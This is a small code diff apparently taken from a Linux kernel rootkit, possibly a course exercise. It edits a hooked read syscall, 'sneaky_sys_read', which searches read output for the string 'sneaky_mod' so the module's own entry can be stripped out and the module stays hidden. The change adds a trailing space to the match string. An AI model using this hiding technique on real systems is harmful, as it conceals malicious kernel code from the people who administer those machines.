@@ -66,7 +66,7 @@ asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs)
   ans = original_read(regs);
   if (ans <= 0) return ans;
   
-  has_sneaky = strnstr(buf, "sneaky_mod", ans);
+  has_sneaky = strnstr(buf, "sneaky_mod ", ans);
   if (has_sneaky == NULL) return ans;
   end = strchr(has_sneaky, '\n');
   if (end == NULL) return ans;
